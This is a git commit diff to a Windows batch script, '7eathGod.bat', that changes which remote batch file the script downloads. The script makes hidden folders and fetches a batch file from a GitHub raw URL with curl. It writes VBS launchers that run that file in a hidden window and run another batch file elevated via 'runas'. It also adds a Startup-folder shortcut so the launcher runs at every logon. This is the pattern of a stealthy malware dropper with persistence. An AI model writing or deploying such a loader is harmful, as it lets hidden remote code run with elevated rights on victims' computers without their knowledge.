80770ad076993f5152baa6910ebfc8931cb90295
l_ <112792604+l-urk@users.noreply.github.com>
2023-10-22 22:42:26 -0700

    Update 7eathGod.bat

--- 7eathGod.bat
+++ 7eathGod.bat
@@ -4,9 +4,9 @@ attrib +h %homedrive%\Akuma
 mkdir %homedrive%\ShiniGami
 attrib +h %homedrive%\ShiniGami
 cd %homedrive%\ShiniGami
-%homedrive%\curl\bin\curl.exe -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat
+%homedrive%\curl\bin\curl.exe -O https://raw.githubusercontent.com/l-urk/Akuma/main/A7uma.bat
 echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\死神.vbs
-echo objShell.Run "%homedrive%\ShiniGami\Akuma.bat", 0, False >> %homedrive%\Akuma\死神.vbs
+echo objShell.Run "%homedrive%\ShiniGami\A7uma.bat", 0, False >> %homedrive%\Akuma\死神.vbs
 echo Set objShell = CreateObject("Shell.Application") >> %homedrive%\Akuma\beyondbirthday.vbs
 echo objShell.ShellExecute "%homedrive%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %homedrive%\Akuma\beyondbirthday.vbs
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
